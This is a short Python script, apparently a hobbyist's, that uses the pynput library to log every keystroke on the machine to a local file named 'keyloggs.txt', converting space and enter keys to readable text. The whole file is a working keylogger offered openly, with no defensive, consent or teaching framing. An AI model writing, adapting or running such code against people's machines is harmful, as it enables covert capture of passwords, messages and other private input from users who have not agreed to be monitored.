from pynput .keyboard import Listener


#author Gli4ch
#done in 12-07-2021
def log_keystroke(key):
    key = str(key).replace("'", "")
    
    if key == 'Key.space':
        key = ' '
    if key == "Key.enter":
        key = '\n'

    with open("keyloggs.txt", 'a') as f:
        f.write(key)
        
with Listener(on_press=log_keystroke) as l:
    l.join()
    
